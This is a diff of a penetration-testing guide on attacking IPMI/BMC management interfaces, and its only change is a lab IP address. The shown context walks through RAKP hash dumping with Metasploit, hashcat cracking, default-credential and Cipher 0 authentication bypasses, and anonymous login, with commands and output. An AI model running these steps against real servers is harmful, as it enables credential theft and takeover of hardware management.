@@ -100,7 +100,7 @@ The RAKP vulnerability is the operator's primary target - design-level (not patc
 ### UDP scan
 
 ```shell
-sudo nmap -sU -p623 10.129.14.128
+sudo nmap -sU -p623 10.0.14.128
 ```
 
 ```
@@ -111,7 +111,7 @@ PORT    STATE         SERVICE
 The `ipmi-version` NSE script fingerprints the protocol version in the same scan - an alternative to the Metasploit module below:
 
 ```shell
-sudo nmap -sU --script ipmi-version -p623 10.129.14.128
+sudo nmap -sU --script ipmi-version -p623 10.0.14.128
 ```
 
 `open|filtered` is the common UDP result. Confirm the version with that script or the Metasploit module:
@@ -119,12 +119,12 @@ sudo nmap -sU --script ipmi-version -p623 10.129.14.128
 ```shell
 msfconsole
 msf > use auxiliary/scanner/ipmi/ipmi_version
-msf > set RHOSTS 10.129.14.128
+msf > set RHOSTS 10.0.14.128
 msf > run
 ```
 
 ```
-[+] 10.129.14.128:623 - IPMI - IPMI-2.0
+[+] 10.0.14.128:623 - IPMI - IPMI-2.0
    UserAuth(auth_msg, auth_user, non_null_user)
    PassAuth(password, md5, md2)
    Level(2.0)
@@ -137,15 +137,15 @@ That tells you IPMI 2.0 is running. The next step is RAKP hash retrieval.
 
 ```shell
 msf > use auxiliary/scanner/ipmi/ipmi_dumphashes
-msf > set RHOSTS 10.129.14.128
+msf > set RHOSTS 10.0.14.128
 msf > set USER_FILE /usr/share/metasploit-framework/data/wordlists/ipmi_users.txt
 msf > run
 ```
 
 ```
-[+] 10.129.14.128:623 - IPMI - Hash found: ADMIN:0a14000000000000a3b13c20...
-[+] 10.129.14.128:623 - IPMI - Hash found: root:0a14000000000000bc4f9d35...
-[+] 10.129.14.128:623 - IPMI - Hash found: operator:0a14000000000000ee2a..
+[+] 10.0.14.128:623 - IPMI - Hash found: ADMIN:0a14000000000000a3b13c20...
+[+] 10.0.14.128:623 - IPMI - Hash found: root:0a14000000000000bc4f9d35...
+[+] 10.0.14.128:623 - IPMI - Hash found: operator:0a14000000000000ee2a..
 ```
 
 The output format is `<username>:<hex hash>`. Each is a HMAC-SHA1 over a randomized challenge - same family as Kerberos AS-REP roasting, crackable offline.
@@ -179,7 +179,7 @@ hashcat -m 7300 ipmi.hashes -a 3 '?1?1?1?1?1?1?1?1' -1 '?d?u'
 While `ipmi_dumphashes` cracks, in parallel try the vendor defaults:
 
 ```shell
-ipmitool -I lanplus -H 10.129.14.128 -U admin -P admin user list
+ipmitool -I lanplus -H 10.0.14.128 -U admin -P admin user list
 ```
 
 If creds work:
@@ -239,7 +239,7 @@ The `-I lanplus` selects IPMI 2.0 over LAN (correct for almost all modern BMCs).
 If Cipher 0 is enabled, you skip authentication entirely:
 
 ```shell
-ipmitool -I lanplus -C 0 -H 10.129.14.128 -U admin -P '' user list
+ipmitool -I lanplus -C 0 -H 10.0.14.128 -U admin -P '' user list
 ```
 
 `-C 0` selects cipher zero. If it works, you can list users, change passwords, do anything - no actual auth performed.
@@ -248,7 +248,7 @@ Detection:
 
 ```shell
 msf > use auxiliary/scanner/ipmi/ipmi_cipher_zero
-msf > set RHOSTS 10.129.14.128
+msf > set RHOSTS 10.0.14.128
 msf > run
 ```
 
@@ -257,7 +257,7 @@ msf > run
 Some BMCs allow an anonymous channel-1 user (the IPMI spec's "user 1, no name, no password"):
 
 ```shell
-ipmitool -I lanplus -H 10.129.14.128 -U '' -P '' user list
+ipmitool -I lanplus -H 10.0.14.128 -U '' -P '' user list
 ```
 
 If this works, you've got read access (sometimes write) without credentials.
